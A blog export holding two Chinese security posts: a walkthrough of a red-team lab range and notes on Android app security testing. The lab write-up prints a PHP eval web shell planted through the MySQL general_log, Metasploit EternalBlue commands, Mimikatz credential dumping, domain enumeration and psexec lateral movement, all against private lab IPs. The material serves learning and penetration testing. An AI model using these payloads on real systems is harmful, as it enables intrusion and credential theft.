<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ATT&amp;CK实战系列 红队实战（一）</title>
    <url>/2020/09/03/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%20%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<h2 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h2><h3 id="1-1-靶机下载"><a href="#1-1-靶机下载" class="headerlink" title="1.1 靶机下载"></a>1.1 靶机下载</h3><p>百度网盘： <a href="https://pan.baidu.com/s/1nC6V8e_EuKfaLb2IuEbe7w&amp;shfl=sharepset" target="_blank" rel="noopener">https://pan.baidu.com/s/1nC6V8e_EuKfaLb2IuEbe7w&amp;shfl=sharepset</a><br>密码为：n1u2。<br>开机密码：hongrisec@2019</p>
<h3 id="1-2-网络拓扑及IP规划"><a href="#1-2-网络拓扑及IP规划" class="headerlink" title="1.2 网络拓扑及IP规划"></a>1.2 网络拓扑及IP规划</h3><p>​    下载包中的VM1为win7，VM2为win2003，VM3为win2008，拓扑图为下图所示：</p>
<p><img src="https://image.3001.net/images/20200904/15992123162653.png" alt="0"></p>
<a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">win 7（VM1）：</span><br><span class="line">	外网ip：192.168.44.131</span><br><span class="line">	内网ip：192.168.88.143</span><br><span class="line">	关闭域防火墙</span><br><span class="line">	开启phpstudy</span><br><span class="line">win2003（VM2）：</span><br><span class="line">	内网ip：192.168.88.141</span><br><span class="line">win2008（VM3）：</span><br><span class="line">	内网ip：192.168.88.138</span><br><span class="line">	关闭防火墙</span><br></pre></td></tr></table></figure>

<p>​    内网中的win 7、win2003、win2008能够互相ping通。</p>
<h2 id="2-win-7渗透（VM1）"><a href="#2-win-7渗透（VM1）" class="headerlink" title="2. win 7渗透（VM1）"></a>2. win 7渗透（VM1）</h2><h3 id="2-1-信息收集"><a href="#2-1-信息收集" class="headerlink" title="2.1 信息收集"></a>2.1 信息收集</h3><p>1）使用nmap扫描本网段存活主机。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -O 192.168.44.0&#x2F;24</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200904/1599212320413.png" alt="image-20200825102051387"></p>
<p>2）得到192.168.44.131主机并开启了80端口，通过访问得到服务器版本、物理路径等敏感信息。</p>
<p><img src="https://image.3001.net/images/20200904/15992123234442.png" alt="image-20200825102901271"></p>
<p>3）进行目录扫描。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dirb http:&#x2F;&#x2F;192.168.44.131</span><br></pre></td></tr></table></figure>

<p>4）再使用御剑进行扫描，</p>
<p><img src="https://image.3001.net/images/20200904/15992123264893.png" alt="image-20200825104554719"></p>
<p>得到<code>/phpmyadmin/</code> <code>beifen.rar</code> 等一些敏感目录。</p>
<h3 id="2-2-漏洞利用"><a href="#2-2-漏洞利用" class="headerlink" title="2.2 漏洞利用"></a>2.2 漏洞利用</h3><p>1）下载<code>beifen.rar</code> 网站备份文件，查找关键信息，得到数据库的连接用户名密码。</p>
<p><img src="https://image.3001.net/images/20200904/15992123288796.png" alt="image-20200825110115423"></p>
<p>2）访问<code>/phpmyadmin</code> ，使用获取的用户名密码进行登录，成功进入。</p>
<p><img src="https://image.3001.net/images/20200904/15992123303851.png" alt="image-20200825110423084"></p>
<p>3）可使用sql写入一句话，写入失败。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT &#39;&lt;?php @eval($_POST[cmd]);?&gt;&#39; INTO OUTFILE C:&#x2F;phpstudy&#x2F;WWW&#x2F;joker.php;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200904/15992123347900.png" alt="image-20200825110948894"></p>
<p>4）查看<code>secure-file-priv</code> 是否为空，很可惜，值为NULL，无法写入一句话。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &quot;secure_file_priv&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200904/15992123367194.png" alt="image-20200825111054954"></p>
<p>5）转换思路，利⽤ log ⽇志插⼊⼀句话，首先查看日志是否开启。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show variables like &#39;%general%&#39;;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200904/15992123383073.png" alt="image-20200825111814209"></p>
<p>6）开启general_log将所有查询语句记录到新指定的可访问的文件中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set global general_log&#x3D;&quot;ON&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200904/15992123405042.png" alt="image-20200825112229269"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set global general_log_file&#x3D;&#39;C:&#x2F;phpStudy&#x2F;WWW&#x2F;joker.php&#39;;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200904/15992123426237.png" alt="image-20200825112349936"></p>
<p>7）查询一句话写入我们指定的新文件中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &quot;&lt;?php eval($_POST[cmd]);?&gt;&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200904/15992123442231.png" alt="image-20200825112815425"></p>
<p>8）菜刀连接。</p>
<p><img src="https://image.3001.net/images/20200904/15992123471469.png" alt="image-20200825131954992"></p>
<h3 id="2-3-其他漏洞利用"><a href="#2-3-其他漏洞利用" class="headerlink" title="2.3 其他漏洞利用"></a>2.3 其他漏洞利用</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1）后台弱口令</span><br><span class="line">2）mysql、phpmyadmin弱口令</span><br><span class="line">3）留言板存储型xss</span><br><span class="line">4）后台修改模板处任意文件读写</span><br></pre></td></tr></table></figure>

<p>​    其他的不做累述。具体可看yxcms漏洞分析。</p>
<h3 id="2-4-445端⼝（ms17-010）漏洞"><a href="#2-4-445端⼝（ms17-010）漏洞" class="headerlink" title="2.4 445端⼝（ms17_010）漏洞"></a>2.4 445端⼝（ms17_010）漏洞</h3><p>1）开启msf，尝试永恒之蓝。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search ms17_010</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200904/15992123537339.png" alt="image-20200825163056373"></p>
<p>2）验证漏洞存在与否。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010</span><br><span class="line">set RHOSTS 192.168.44.131</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200904/15992123566392.png" alt="image-20200825164940676"></p>
<p>3）利用漏洞反弹shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</span><br><span class="line">set RHOSTS 192.168.44.131</span><br><span class="line">show options</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200904/15992123596617.png" alt="image-20200825165523015"></p>
<p>​    getshell成功，并直接提权成system。</p>
<h2 id="3-内网渗透"><a href="#3-内网渗透" class="headerlink" title="3.内网渗透"></a>3.内网渗透</h2><h3 id="3-1-信息收集"><a href="#3-1-信息收集" class="headerlink" title="3.1 信息收集"></a>3.1 信息收集</h3><p>​    拿下web服务器之后可以上传一个cs马，win7执行后，cs服务端上线主机。</p>
<p><img src="https://image.3001.net/images/20200904/15992123622889.png" alt="image-20200902144954719"></p>
<h4 id="3-1-1-minikatz获取账号密码"><a href="#3-1-1-minikatz获取账号密码" class="headerlink" title="3.1.1 minikatz获取账号密码"></a>3.1.1 minikatz获取账号密码</h4><p>​    使用<code>Mimikatz</code>跑⼀下</p>
<p><img src="https://image.3001.net/images/20200904/15992123648738.png" alt="image-20200902145609561"></p>
<p>​    得到账户：Administrator 密码：hongrisec@2020</p>
<p><img src="https://image.3001.net/images/20200904/15992123678613.png" alt="image-20200902145542840"></p>
<h4 id="3-1-2-基本信息收集"><a href="#3-1-2-基本信息收集" class="headerlink" title="3.1.2 基本信息收集"></a>3.1.2 基本信息收集</h4><p>​    一些常用命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net time &#x2F;domain        #查看时间服务器，判断主域，主域服务器都做时间服务器</span><br><span class="line">net user &#x2F;domain        #查看域用户</span><br><span class="line">net view &#x2F;domain        #查看有几个域</span><br><span class="line">ipconfig &#x2F;all 　　　　　  #查询本机IP段，所在域等 </span><br><span class="line">net config Workstation  #当前计算机名，全名，用户名，系统版本，工作站域，登陆域 </span><br><span class="line">net user 　　　　　　　   #本机用户列表</span><br><span class="line">net group &quot;domain computers&quot; &#x2F;domain   #查看域内所有的主机名 </span><br><span class="line">net group &quot;domain admins&quot; &#x2F;domain      #查看域管理员 </span><br><span class="line">net group &quot;domain controllers&quot; &#x2F;domain #查看域控</span><br><span class="line">net localhroup administrators          #本机管理员[通常含有域用户]</span><br><span class="line">net user 用户名 &#x2F;domain                 #获取指定用户的账户信息  </span><br><span class="line">net group &#x2F;domain                      #查询域里面的工作组 </span><br><span class="line">net group 组名 &#x2F;domain                  #查询域中的某工作组</span><br></pre></td></tr></table></figure>

<h4 id="3-1-3-内网主机存活和端口扫描"><a href="#3-1-3-内网主机存活和端口扫描" class="headerlink" title="3.1.3 内网主机存活和端口扫描"></a>3.1.3 内网主机存活和端口扫描</h4><p>​    可以使用cs进行一波内网主机存活和端口的扫描。</p>
<p><img src="https://image.3001.net/images/20200904/15992123708213.png" alt="image-20200902153850150"></p>
<p>​    选择内网ip对应的网段。</p>
<p><img src="https://image.3001.net/images/20200904/15992123727545.png" alt="image-20200902153918336"></p>
<p>​    同时也可以使用命令进行扫描：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">portscan 192.168.44.0&#x2F;24 1-1024,3389,5900-6000</span><br></pre></td></tr></table></figure>

<p>​    得到存活的主机ip和开放的端口</p>
<p><img src="https://image.3001.net/images/20200904/15992123754038.png" alt="image-20200902154741262"></p>
<h3 id="3-2-横向移动"><a href="#3-2-横向移动" class="headerlink" title="3.2 横向移动"></a>3.2 横向移动</h3><p>​    添加Pivotting Listener</p>
<p><img src="https://image.3001.net/images/20200904/15992123786299.png" alt="image-20200902172235950"></p>
<p>​    箭头所指填内网ip</p>
<p><img src="https://image.3001.net/images/20200904/1599212380801.png" alt="image-20200902172320616"></p>
<p>​    然后新建⼀个 psexec 程序</p>
<p><img src="https://image.3001.net/images/20200904/15992123826652.png" alt="image-20200902172456250"></p>
<p>​    选择相应的监听器和Session</p>
<p><img src="https://image.3001.net/images/20200904/15992123854270.png" alt="image-20200902172655309"></p>
<p>​    成功连上</p>
<p><img src="https://image.3001.net/images/20200904/15992123887276.png" alt="image-20200902172721638"></p>
<p><img src="https://image.3001.net/images/20200904/15992123909334.png" alt=""></p>
]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>内网</tag>
      </tags>
  </entry>
  <entry>
    <title>APP安全测试学习笔记</title>
    <url>/2020/07/10/App%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>​    通过辉哥发的 “APP安全检测指南–作者：panda” 跟进学习app渗透测试。</p>
<p><img src="https://image.3001.net/images/20200710/15943664048203.png" alt="image-20200710153320829"></p>
<a id="more"></a>

<h2 id="1-客户端程序安全"><a href="#1-客户端程序安全" class="headerlink" title="1.客户端程序安全"></a>1.客户端程序安全</h2><h3 id="1-1安装包签名"><a href="#1-1安装包签名" class="headerlink" title="1.1安装包签名"></a>1.1安装包签名</h3><p>​    用JDK的jarsigner.exe检查安全包的签名，命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jarsigner.exe -verify APK文件路径 -verbose -certs</span><br></pre></td></tr></table></figure>

<p>​    以某个算命app为例，结果如下：</p>
<p><img src="https://image.3001.net/images/20200710/15943657453016.png" alt="image-20200627224441281"></p>
<p>​    如上图，测试结果为安全。只有使用直接客户的证书签名时才认定为安全，Debug 证书、第三方（如开发方）证书等均认为风险。</p>
<h3 id="1-2反编译保护"><a href="#1-2反编译保护" class="headerlink" title="1.2反编译保护"></a>1.2反编译保护</h3><p>​    把apk当做zip解压，得到classes.dex文件（可能不止一个 .dex 文件），解压后如下：</p>
<p><img src="https://image.3001.net/images/20200710/15943657505268.png" alt="image-20200628101834819"></p>
<p>​    使用dex2.jar执行如下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dex2jar.bat classes.dex 文件路径</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200710/15943657542165.png" alt="image-20200628102833253"></p>
<p>​    得到classes.dex.jar文件</p>
<p><img src="https://image.3001.net/images/20200710/15943657588776.png" alt="image-20200628102833254"></p>
<p>​    使用jd-gui打开jar文件，可得到JAVA代码</p>
<p><img src="https://image.3001.net/images/20200710/15943657665063.png" alt="image-20200628104345358"></p>
<p>​    如上图，逆向后发现代码未做混淆，是不安全的。</p>
<p>​    下图为混淆后的代码，函数和变量名用无意义的字符来代替：</p>
<p><img src="https://image.3001.net/images/20200710/15943657716598.png" alt="image-20200628104622176"></p>
<p>​    通过博客得知混淆的原理：android平台的混淆原理是用“不能直接猜出含义 的通用变量名和函数名a b c等”替换编译后程序包中“ 具有明显语义信息 的变量名和函数名”，这样，通过逆向工程得到的只是 难以理解 的代码。代码混淆并不能从根本上阻止反编译等。因为代码混淆仅仅提高了阅读难度，但并不能真正阻止反编译。</p>
<h3 id="1-3应用完整性校验"><a href="#1-3应用完整性校验" class="headerlink" title="1.3应用完整性校验"></a>1.3应用完整性校验</h3><p>​    用apktool将目标apk文件解包，命令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar apktool.jar d -f apk文件路径 -o 解包目标文件夹</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200710/15943657763053.png" alt="image-20200628105738136"></p>
<p>​    文件结构如下：</p>
<p><img src="https://image.3001.net/images/20200710/15943657798481.png" alt="image-20200628105847820"></p>
<p>​    通过修改解包目录中的文件，可以找到logo之类的图进行修改（比较好辨认结果），我修改了咨询处的图片，如下：</p>
<p><img src="https://image.3001.net/images/20200710/15943657834488.png" alt="image-20200628113532130"></p>
<p>​    用apktool，把解包目录重新打包成未签名的apk文件，命令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar apktool.jar b -f 待打包的文件夹 -o 输出apk目录</span><br></pre></td></tr></table></figure>

<p>​    重新打包的时候出现很多问题，具体百度加玄学解决了</p>
<p><img src="https://image.3001.net/images/20200710/15943658034480.png" alt="image-20200628184932619"></p>
<p>​    成功输出apk文件</p>
<p><img src="https://image.3001.net/images/20200710/15943658112861.png" alt="image-20200628185217847"></p>
<p>​    用SignApk，对未签名的APK文件进行签名，命令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar signapk.jar testkey.x509.pem testkey.pk8 待签名apk文件路径 签名后输出apk路径</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200710/15943658167990.png" alt="image-20200629105838083"></p>
<p>​    输出签名后的apk</p>
<p><img src="https://image.3001.net/images/20200710/15943658191790.png" alt="image-20200629105858875"></p>
<p>​    将签了名的APK安装、运行、确认是否存在自校验；需要注意的是，如果之前安装的APK和修改后的APK签名不同，就不能直接覆盖安装，一般来说，先卸载之前安装的APP即可。</p>
<p>​    将客户端程序文件反编译，修改源码或资源文件后重新打包安装运行，结果如下图：</p>
<p><img src="https://image.3001.net/images/20200710/1594365822747.png" alt="image-20200629110321139"></p>
<p>​    之前为咨询图片的位置，我换成了另一张图片。经测试，此某算命app是可以被重新打包运行的。</p>
<p>​    如果是经过自校验后的情况，修改源码资源后是无法正常启动的。</p>
<h3 id="1-4组件安全"><a href="#1-4组件安全" class="headerlink" title="1.4组件安全"></a>1.4组件安全</h3><h4 id="方案一："><a href="#方案一：" class="headerlink" title="方案一："></a>方案一：</h4><p>​    使用apktool解包，打开解包目录中的AndroidManifest.xml，对其中声明的各个组件，根据以下规则判断是否可导出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.显式声明了android:exported&#x3D;&quot;true&quot;，则可导出；</span><br><span class="line">2.显示声明了android:exported&#x3D;&quot;false&quot;，则不可导出；</span><br><span class="line">3.未显示声明android:exported：</span><br><span class="line">​	a) 若组件不是Content Provider：</span><br><span class="line">​		i. 若组件包含&lt;intent-filter&gt;则可导出，反之不可；</span><br><span class="line">​	b) 若组件是Content Provider：</span><br><span class="line">​		i. 若SDK版本&lt;17则可导出，反之不可。</span><br></pre></td></tr></table></figure>

<p>​    从测试的角度上，只能判断组件是否导出，但能否构成危害需要详细分析源代码后才能得出结论。一般来说，在测试时尽管写清所有的导出组件，由客户开发侧确认相关组件是否确实需要导出即可。</p>
<p><img src="https://image.3001.net/images/20200710/15943658316155.png" alt="image-20200629144318194"></p>
<p>​    启动Activity和Content Provider大多是导出组件，一般无须理会。</p>
<h4 id="方案二："><a href="#方案二：" class="headerlink" title="方案二："></a>方案二：</h4><p>​    检查 AndroidManifest.xml 文件中各组件定义标签的安全属性是否设置恰当。如果组件无须跨进程交互，则不应设置 exported 属性为 true。例如，如下图所示，当 com.umeng.message.XiaomiIntentService 的 exported属性为 true 时，将可以被其他应用调用。（当有设置权限(permissions)时，需要再考察权限属性。如 android:protectionLevel 为 signature 或 signatureOrSystem 时，只有相同签名的 apk才能获取权限。详情见附录参考资料API Guides 系统权限简介 ）</p>
<p><img src="https://image.3001.net/images/20200710/15943658358575.png" alt="image-20200629150016127"></p>
<p>​    当发现有可利用的组件导出时，（当然，并不是说所有导出的组件都是不安全的，如果要确定，必须看代码，对代码逻辑进行分析）可利用drozer测试工具进行测试。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">drozer安装：https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;4ef5b26dd3fb</span><br><span class="line">drozer使用：https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;dfa92bab3a55</span><br></pre></td></tr></table></figure>

<h2 id="2-敏感信息安全"><a href="#2-敏感信息安全" class="headerlink" title="2.敏感信息安全"></a>2.敏感信息安全</h2><h3 id="2-1数据文件"><a href="#2-1数据文件" class="headerlink" title="2.1数据文件"></a>2.1数据文件</h3><p>​    首先查看相关文件的权限配置，正常的文件权限最后三位应为空（类似”rw-rw—-“）,即除应用自己以外任何人无法读写；目录则允许多一个执行位（类似“rwxrwx—x”）。如下图：</p>
<p><img src="https://image.3001.net/images/20200710/15943658388450.png" alt="image-20200629160646287"></p>
<p>​    权限检测完整后，再检查客户端程序存储在手机中的 SharedPreferences 配置文件，通常是对本目录下的文件内容（一般是xml）进行检查，看是否包含敏感信息。最后在检测SQLite 数据库文件，在私有目录及其子目录下查找以.db 结尾的数据库文件。对于使用了 webView 缓存的应用，会在 databases 子目录中保存 webview.db 和 webviewCache.db。其中有可能会记录 cookies 和提交表单等信息。使用数据库查看工具即可查看这些文件中是否有敏感信息。</p>
<p>​    还有些时候，客户端程序 apk 包中也是是保存有敏感信息的，比如检查 apk 包中各类文件是否包含硬编码的的敏感信息等。</p>
<h3 id="2-2Logcat日志"><a href="#2-2Logcat日志" class="headerlink" title="2.2Logcat日志"></a>2.2Logcat日志</h3><p>​    通过adb 工具连接设备：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb devices  &#x2F;&#x2F;查看安卓设备列表</span><br><span class="line">adb -s 设备名称 其它命令  &#x2F;&#x2F;当连接了多个设备时，选择操作的目标设备，否则会出错</span><br><span class="line">adb pull 手机目录名 PC目录名  &#x2F;&#x2F;从安卓设备中复制文件到电脑中</span><br></pre></td></tr></table></figure>

<p>然后使用 WinHex 打开，查看内存遗留信息。</p>
<p>也可以直接用adb查询locat日志：</p>
<p>在adb shell中，有下列命令可用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">logcat  &#x2F;&#x2F;持续输出日志，直到Ctrl+C</span><br><span class="line">logcat -d  &#x2F;&#x2F;一次性输出日志缓存，不会阻塞</span><br><span class="line">logcat -c  &#x2F;&#x2F;清空日志缓存</span><br></pre></td></tr></table></figure>

<h2 id="3-密码安全"><a href="#3-密码安全" class="headerlink" title="3.密码安全"></a>3.密码安全</h2><h3 id="3-1键盘劫持"><a href="#3-1键盘劫持" class="headerlink" title="3.1键盘劫持"></a>3.1键盘劫持</h3><p>​    通常来说，只有使用系统输入法的编辑框才能够进行键盘码记录。如果是自制的软键盘，则可以尝试进行触摸屏记录。像下图这样，不使用系统输入法，且按键随机分布的软键盘是安全的。</p>
<p><img src="https://image.3001.net/images/20200710/15943658435573.png" alt="image-20200629173937788"></p>
<h3 id="3-2随机布局软件盘"><a href="#3-2随机布局软件盘" class="headerlink" title="3.2随机布局软件盘"></a>3.2随机布局软件盘</h3><p>​    当客户端软键盘未进行随机化处理时为低风险;当客户端软键盘只在某一个页面载入时初始化一次而不是在点击输入框时重新进行随机化也为低风险。</p>
<h3 id="3-3屏幕录像"><a href="#3-3屏幕录像" class="headerlink" title="3.3屏幕录像"></a>3.3屏幕录像</h3><p>​    使用ADB进行测试：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb shell &#x2F;system&#x2F;bin&#x2F;screencap -p 输出png路径（安卓设备中）</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200710/1594365848230.png" alt="image-20200709161454548"></p>
<p>​    运行截图命令后，可以在 /mnt/sdcard/ 目录中查看到存在1.png</p>
<p><img src="https://image.3001.net/images/20200710/15943658509313.png" alt="image-20200709162105260"></p>
<p>​    打开查看：</p>
<p><img src="https://image.3001.net/images/20200710/15943658547041.jpg" alt="Screenshot_20200709_162157_com.android.gallery3d"></p>
<p>成功截图。</p>
<p>​    攻击者可以在用户进入登录页面，在输入密码的同时，进行连续截图，即可记录用户输入的密码。如果没有防截屏，那么即使是随机分布的、没有视觉反馈的软键盘也会被记录：<br>​    还有一种验证方式是从代码方面进行验证：首先检测需较高安全性的窗口（如密码输入框），看代码中在窗口加载时是否有类似下图的代码。按照 android SDK 的要求，开启 FLAG_SECURE 选项的窗口不能被截屏。</p>
<p><img src="https://image.3001.net/images/20200710/15943658647619.png" alt="image-20200709162413334"></p>
<p>目前 FLAG_SECURE 测试结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">N－PASS，可截图，</span><br><span class="line">ZTE 880E, 可截图</span><br><span class="line">ASUS TF300T，可阻止工具及 ddms 截图。</span><br></pre></td></tr></table></figure>

<h3 id="3-4手势密码"><a href="#3-4手势密码" class="headerlink" title="3.4手势密码"></a>3.4手势密码</h3><p>​    手势密码的复杂度：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.进入客户端设置手势密码的页面进行手势密码设置。</span><br><span class="line">2.进行手势密码设置，观察客户端手势密码设置逻辑是否存在最少点位的判断。</span><br><span class="line">3.反编译 APK 为 jar 包，通过 jd-gui 观察对应代码逻辑是否有相应的判断和限制条件。（一般设置手势密码若输入点数过少时会有相应的文字提示，通过此文字提示可以快速定位到代码位置）</span><br></pre></td></tr></table></figure>

<p>​    手势密码的修改和取消：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.进入客户端设置手势密码的位置，一般在个人设置或安全中心等地方。</span><br><span class="line">2.进行手势密码修改或取消操作，观察进行此类操作时是否需要输入之前的手势密码或普通密码。</span><br><span class="line">3.观察在忘记手势密码等其他客户端业务逻辑中是否存在无需原始手势或普通密码即可修改或取消手势密码的情况。</span><br><span class="line">4.多次尝试客户端各类业务，观察是否存在客户端逻辑缺陷使得客户端可以跳转回之前业务流程所对应页面。若存在此类逻辑（例如手势密码设置），观察能否修改或取消手势密码。</span><br><span class="line">5.反编译 APK 为 jar 包，通过 jd-gui 观察对应代码逻辑，寻找客户端对于手势密码的修改和删除是否存在相应的安全策略。</span><br></pre></td></tr></table></figure>

<p>​    手势密码的本地信息保存：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.首先通过正常的操作流程设置一个手势密码并完整一次完整的登陆过程。</span><br><span class="line">2.寻找&#x2F;data&#x2F;data 的私有目录下是否存在手势密码对应敏感文件，若进行了相关的信息保存，基本在此目录下。（关键词为 gesture，key 等）</span><br><span class="line">3.若找到对应的文件，观察其存储方式，为明文还是二进制形式存储，若为二进制形式，观察其具体位数是否对应进行 MD5（二进制 128 位，十六进制 32 位或 16 位）、SHA-1（二进制 160 位，十六进制 40 位）等散列后的位数。如果位数对应，即可在反编译的jar包中搜索对应的关键字以迅速对应代码。</span><br><span class="line">4.通过代码定位确认其是否进行了除单项哈希散列之外的加密算法，若客户端未将手势密码进行加密或变形直接进行散列处理可认为其不安全，一是因为现阶段 MD5、SHA-1 等常用的哈希算法已被发现碰撞漏洞，二是网络中存在 www.somd5.com 等散列值查询网站可以通过大数据查询的方式获取散列前的明文手势密码。</span><br></pre></td></tr></table></figure>

<p>​    手势密码的锁定策略：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.首先通过正常的操作流程设置一个手势密码。</span><br><span class="line">2.输入不同于步骤 1 中的手势密码，观察客户端的登陆状态及相应提示。若连续输入多次手势密码错误，观察当用户处于登陆状态时是否退出当前的登陆状态并关闭客户端；当</span><br><span class="line">客户未处于登录状态时是否关闭客户端并进行一定时间的输入锁定。</span><br><span class="line">3.反编译 APK 为 jar 包，通过 jd-gui 观察对应代码逻辑，寻找客户端是否针对输入次数及锁定时间有相应的逻辑处理。</span><br></pre></td></tr></table></figure>

<p>​    手势密码的抗攻击测试：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.下载并安装 Xposed 框架及 SwipeBack 插件。</span><br><span class="line">2.启动客户端并进入手势密码输入页。</span><br><span class="line">3.启动 SwipeBack 插件，观察是否可以通过滑动关闭手势密码输入页的方式进入登陆后的页面。</span><br></pre></td></tr></table></figure>

<h2 id="4-安全策略"><a href="#4-安全策略" class="headerlink" title="4.安全策略"></a>4.安全策略</h2><h3 id="4-1密码复杂度检测："><a href="#4-1密码复杂度检测：" class="headerlink" title="4.1密码复杂度检测："></a>4.1密码复杂度检测：</h3><p>​    测试客户端程序是否检查用输入的密码强度，禁止设置弱口令。</p>
<h3 id="4-2账号登录限制："><a href="#4-2账号登录限制：" class="headerlink" title="4.2账号登录限制："></a>4.2账号登录限制：</h3><p>​    测试一个帐号是否可以同时在多设备上成功登录客户端，进行操作。 </p>
<h3 id="4-3账户锁定策略"><a href="#4-3账户锁定策略" class="headerlink" title="4.3账户锁定策略"></a>4.3账户锁定策略</h3><p>​    测试客户端是否限制登录尝次数。 防止木马使用穷举法暴力破解用户密码。</p>
<h3 id="4-4问题验证"><a href="#4-4问题验证" class="headerlink" title="4.4问题验证"></a>4.4问题验证</h3><p>​    测试对账号某些信息（如单次支付限额）的修改是否有私密问题验证。私密问题验证是否将问题和答案一一对应。私密问题是否足够机密。</p>
<h3 id="4-5会话安全"><a href="#4-5会话安全" class="headerlink" title="4.5会话安全"></a>4.5会话安全</h3><p>​    测试客户端在超过20分钟无操作后，是否会使会话超时并要求重新登录。超时时间是否合理。</p>
<h3 id="4-6界面切换保护"><a href="#4-6界面切换保护" class="headerlink" title="4.6界面切换保护"></a>4.6界面切换保护</h3><p>​    检查客户端程序在切换到其他应用时，已经填写的账号密码等敏感信息是否会清空，防止用户敏感信息泄露。如果切换前处于已登录状态，切换后一定时间内是否会自动退出当前会话。</p>
<h3 id="4-7UI信息泄露"><a href="#4-7UI信息泄露" class="headerlink" title="4.7UI信息泄露"></a>4.7UI信息泄露</h3><p>​    检查客户端的各种功能，看是否存在敏感信息泄露问题。使用错误的登录名或密码，看客户端提示是否不同。在显示卡号等敏感信息时是否进行部分遮挡。</p>
<h3 id="4-8验证码安全"><a href="#4-8验证码安全" class="headerlink" title="4.8验证码安全"></a>4.8验证码安全</h3><p>​    测试客户端在登录和交易时是否使用图形验证码。验证码是否符合如下要求:由数字和字母等字符混合组成;采取图片底纹干扰、颜色变换、设置非连续性及旋转图片字体、异字体显示样式等有效方式，防范恶意代码自动识别图片上的信息;具有使用时间限制并仅能使用一次;验证码由服务器生成，客户端文件中不包含图形验证码文本内容。（观察验证码组成,若简单,可以尝试使用PKAVHttpFuzzer的验证码识别工具进行识别）</p>
<h3 id="4-9安全退出"><a href="#4-9安全退出" class="headerlink" title="4.9安全退出"></a>4.9安全退出</h3><p>​    检查客户端在退出时，是否向服务端发送终止会话请求。客户端退出后，还能否使用退出前的会话id访问登录后才能访问的页面。</p>
<h3 id="4-10密码修改验证"><a href="#4-10密码修改验证" class="headerlink" title="4.10密码修改验证"></a>4.10密码修改验证</h3><p>​    测试客户端在修改密码时是否验证旧密码正确性。</p>
<h3 id="4-11Activity界面劫持"><a href="#4-11Activity界面劫持" class="headerlink" title="4.11Activity界面劫持"></a>4.11Activity界面劫持</h3><p>​    安装Hi jackActivity.apk,使用activity 界面劫持工具，在工具中指定要劫持的应用进程名称。如图所示，从列表中选择被测试的应用，点击0K。打开应用，测试工具会尝试用自己的窗口覆盖被测的应用。</p>
